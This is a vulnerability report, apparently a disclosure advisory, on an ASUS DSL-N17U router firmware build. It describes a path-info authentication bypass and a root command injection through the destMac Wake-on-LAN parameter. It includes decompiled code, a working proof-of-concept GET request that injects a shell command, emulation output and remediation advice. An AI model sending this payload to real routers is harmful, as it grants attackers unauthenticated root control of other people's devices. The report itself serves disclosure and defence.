# ASUS DSL-N17U 1.1.2.3_792 was discovered to contain an authentication bypass and command injection vulnerability

## Overview

- Vendor: ASUS
- Product: DSL-N17U DSL router
- Version: 1.1.2.3_792
- Component: userfs/bin/boa, ASP builtin WOL_Invoke
- Vulnerability Class: CWE-306/CWE-288 authentication bypass and CWE-78 command injection
- CVSS 3.1 (tentative): 9.8 Critical `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- Manufacturer: https://www.asus.com/

## Affected versions

- `DSL-N17U_1.1.2.3_792-g530e5586b.trx`, 37,708,988 bytes.
- `userfs/bin/boa`.
  (`Boa/0.94.13`, MIPS32 big-endian, stripped).
- `boaroot/boa.conf`.
  (`User 0`, `Group 0`, `ScriptAlias /cgi-bin/ /boaroot/cgi-bin/`).

## Vulnerability details

### 1. Login bypass by path info containing a static-extension substring

`process_header_end` (`0x4112a0`) calls `sub_40F654(uri)`, which wraps
`sub_40F464` (`0x40f464`):

```c
bool sub_40F464(const char *uri)
{
  return strstr(uri, ".js") || strstr(uri, ".gif") || strstr(uri, ".png")
      || strstr(uri, ".jpg") || strstr(uri, ".css") || strstr(uri, ".ico")
      || strstr(uri, "error_page.asp") || strstr(uri, "update_applist.asp")
      || strstr(uri, "Main_Login.asp")
      || (strstr(uri, "login.asp") && !strstr(uri, "mod_login.asp"))
      || strstr(uri, "get_webdavInfo.asp")
      || strstr(uri, "appGet_image_path.asp") || strstr(uri, "setting_lan.asp")
      || strstr(uri, "index.asp") || strstr(uri, "blocking.asp");
}
```

When this returns true, `sub_40F654` returns 0 and the session check
(`sub_411154`, which validates the `asus_token` cookie against the
client IP) is skipped for the request. Boa still honors extra path
info after an existing script, so:

```text
/cgi-bin/Main_WOL_Content.asp        -> 302/login redirect (no session)
/cgi-bin/Main_WOL_Content.asp/x.js   -> 200, the real WOL page executed
```

The check uses `strstr` on the whole request path, so any appended path
segment or file name containing `.js`, `.gif`, `.css`, `index.asp`,
etc. disables authentication for the protected ASP page. This is not
limited to the WOL page: e.g. `Advanced_System_Content.asp/x.js`
returns the 63 KB admin System page (title `ASUS DSL-N17U - System`)
without a cookie.

### 2. `WOL_Invoke` executes `destMac` through `system()`

`Main_WOL_Content.asp` contains:

```asp
<%
If Request_Form("applyFlag") = "1" Then
	WOL_Invoke()
End If
%>
```

and its main form is submitted with `method="GET"` (line 492):

```html
<form method="GET" name="form" action="Main_WOL_Content.asp" target="hidden_frame">
  ...
  <input type="hidden" name="applyFlag" value="0">
  ...
  <input type="text" ... name="destMac" ...>
```

The registered ASP builtin `WOL_Invoke` (`0x424780`) is:

```c
int sub_424780()
{
  const char *v1 = get_param(*(_DWORD *)g_var_post, "destMac");
  char s[516];
  if (!v1) return 0;
  memset(s, 0, sizeof(s));
  snprintf(s, 0x200u, "ether-wake -i %s %s", "br0", v1);
  return system(s);
}
```

There is no server-side validation, quoting, or escaping of `destMac`;
the only MAC check is client-side JavaScript (`check_hwaddr_flag`) in
the page. A `destMac` containing `;` therefore starts a second shell
command. Because the HTTP request itself is a GET, neither a session
cookie nor the POST `Referer` check is needed.

## PoC

```http
GET /cgi-bin/Main_WOL_Content.asp/x.js?applyFlag=1&destMac=;cp+/boaroot/boa.conf+/tmp/ASUS_PREAUTH_RCE_STRONG; HTTP/1.1
Host: <router>
```

No `Cookie`, no `Authorization`, no session. `+` is the form-encoded
space. The router executes:

```sh
ether-wake -i br0 ;cp /boaroot/boa.conf /tmp/ASUS_PREAUTH_RCE_STRONG;
```

Check the marker on the device:

```sh
ls -l /tmp/ASUS_PREAUTH_RCE_STRONG
cmp -s /tmp/ASUS_PREAUTH_RCE_STRONG /boaroot/boa.conf && echo "marker == boa.conf"
# marker == boa.conf
```

The marker is byte-identical to `/boaroot/boa.conf` (8074 bytes). The
test was repeated with a non-default web password (`Secret123!`), not
just the default, and still succeeded. `boa.conf` ships with
`User 0`/`Group 0`, so on the device `boa` and the `system()` child
run as root.

## Dynamic verification

The stock `boa` binary and the stock extracted rootfs were run under
`qemu-mips-static` 6.2.0 in a `bwrap` chroot, with a minimal Unix
socket stub implementing the `libtcapi` `GET` protocol
(`/tmp/tcapi_sock`) to supply configuration values (including
`SysInfo_Entry/x_Setting=1` and a non-default `web_passwd`). No target
binary was patched or instrumented for the exploit; the stub only
answers config lookups.

Observed:

- `GET /cgi-bin/Main_WOL_Content.asp` -> 200 with
  `<meta http-equiv="refresh" content="0; url=/Main_Login.asp?page=/cgi-bin/Main_WOL_Content.asp">`.
- `GET /cgi-bin/Main_WOL_Content.asp/x.js` -> 200 with the full WOL
  page (`name="destMac"` present), no cookie sent.
- `GET .../x.js?applyFlag=1&destMac=;cp+/boaroot/boa.conf+/tmp/ASUS_PREAUTH_RCE_STRONG;`
  -> 200 and `/tmp/ASUS_PREAUTH_RCE_STRONG` created with the exact
  content of `/boaroot/boa.conf`.
- `GET /cgi-bin/Advanced_System_Content.asp/x.js` -> 200 with the
  protected admin System page.
- `/proc/<shell>/cmdline` captured for the WOL handler:
  `ether-wake -i br0 $(cat</proc/$$/cmdline>/tmp/WOLCMD)`.

## Evidence

`experiments/vulnerability-triage/results/20261108-asus-dsl-n17u-preauth-rce-01/evidence/`

- `http_plain_login_redirect.txt` — control, no session.
- `http_pathinfo_js_bypass.txt` — `.asp/x.js` returns the WOL page.
- `http_advanced_system_bypass.txt` — `Advanced_System_Content.asp/x.js`
  returns the 63,549-byte admin System page (title
  `ASUS DSL-N17U - System`) with no session;
  `http_advanced_system_plain_redirect.txt` is the login-redirect
  control for the same page.
- `http_wol_rce_request.txt`,
  `http_wol_rce_nondefault_password.txt` — exploit responses.
- `marker_ASUS_PREAUTH_PWNED`,
  `marker_ASUS_PREAUTH_RCE_STRONG` — 8074-byte copies of `boa.conf`
  produced by the injected `cp`.
- `shell_cmdline_wol.txt` — captured generated command line.
- `tcapi_stub.py`, `start_boa_emulation.sh`, `boa_run.conf` — harness.

## Impact

An unauthenticated remote attacker who can reach the web management
interface can execute arbitrary commands as root by sending a single
GET request. The same path-info trick exposes every protected ASP page
(settings, password, diagnostics, admin System page) without a login,
so the authentication boundary of the web UI is effectively removed.
The DSL-N17U is EOL, but 1.1.2.3_792 is its final firmware and is the
exact release that ASUS published as the fix for CVE-2024-3912
(unauthenticated arbitrary firmware upload -> RCE).

## Remediation

- Do not decide authentication from `strstr` on the request path.
  Determine the effective script/static file after path
  normalization, and require a valid session for every `.asp`/`.cgi`
  page; only serve genuine static extensions without a session.
- Reject or ignore unexpected path info after ASP file names.
- Remove the shell from `WOL_Invoke`: validate `destMac` as a MAC
  address (six hex octets) and invoke `ether-wake` via `execve` with
  separate arguments, never through `system()`.
- Apply the same exec-style fix to the Network Tools handlers (see the
  companion report).

## Known-CVE relation

- CVE-2024-3912 — ASUS DSL-N17U unauthenticated arbitrary firmware
  upload; TWCERT lists 1.1.2.3_792 as the fixed version for
  DSL-N17U. This report targets that fixed build and uses different
  endpoints and a different root cause.
- CVE-2024-3080 — ASUS router authentication bypass, but the TWCERT
  affected list is ZenWiFi XT8 / RT-AX88U / RT-AX58U / RT-AX57 /
  RT-AC86U / RT-AC68U, not the DSL series.
- CVE-2018-15887 — authenticated RCE in `Main_Analysis_Content.asp`
  on DSL-N12E_C1 1.1.2.3_345 via `destIP`; different model/build.
  The WOL `destMac` sink in this report is a separate handler, and the
  path-info login bypass is not part of that CVE.
- CVE-2025-59367 — DSL-series authentication bypass; NVD CPEs list
  DSL-AC51, DSL-N16 and DSL-AC750, not DSL-N17U.
- NVD keyword searches on 2026-11-08 for `DSL-N17U`, `boa .asp path
  info authentication bypass`, and the `WOL_Invoke`/`destMac` strings
  returned no matching entry. Candidate 0-day; no CVE assigned and no
  vendor contact has been made.

## Debug output

Control request without path info (no Cookie):

```http
GET /cgi-bin/Main_WOL_Content.asp HTTP/1.0
Host: 127.0.0.1:8080

HTTP/1.0 200 OK
Server: Boa/0.94.13
Content-Type: text/html; charset=ISO-8859-1

<meta http-equiv="refresh" content="0; url=/Main_Login.asp?page=/cgi-bin/Main_WOL_Content.asp">
```

Bypass and exploit request (no Cookie):

```http
GET /cgi-bin/Main_WOL_Content.asp/x.js?applyFlag=1&destMac=;cp+/boaroot/boa.conf+/tmp/ASUS_PREAUTH_RCE_STRONG; HTTP/1.0
Host: 127.0.0.1:8080

HTTP/1.0 200 OK
Content-type: text/javascript;charset=utf-8

<!DOCTYPE html ...>  <!-- full WOL page, name="destMac" present -->
```

Marker on the emulated device:

```text
$ cmp -s /tmp/ASUS_PREAUTH_RCE_STRONG /boaroot/boa.conf && echo "marker == boa.conf"
marker == boa.conf
$ wc -c /tmp/ASUS_PREAUTH_RCE_STRONG
8074 /tmp/ASUS_PREAUTH_RCE_STRONG
```

The marker is byte-identical to `boaroot/boa.conf` (8074 bytes).
Captured shell command line:

```text
/bin/sh -c ether-wake -i br0 $(cat</proc/$$/cmdline>/tmp/WOLCMD)
```

## Additional Information

```markdown
### Vendor
ASUS

### Product
DSL-N17U DSL router

### Version or Commit
1.1.2.3_792

### Vulnerability Class
CWE-306/CWE-288 authentication bypass and CWE-78 command injection

### Description
ASUS DSL-N17U 1.1.2.3_792 decides whether an ASP page is login-exempt with strstr on the request path. Appending path info such as /x.js to a protected page bypasses authentication, and the WOL_Invoke ASP builtin passes the destMac parameter to system("ether-wake -i br0 %s"). An unauthenticated attacker can execute commands as root.

### Affected_component
userfs/bin/boa, ASP builtin WOL_Invoke

### Attack_vector
Unauthenticated GET /cgi-bin/Main_WOL_Content.asp/x.js?applyFlag=1&destMac=<payload>.

### Product_version
DSL-N17U DSL router 1.1.2.3_792

### Reference
- https://www.asus.com/
- https://github.com/vuln-1/vuln/blob/main/ASUS/DSL-N17U_V1.1.2.3_792/report-1.md
```
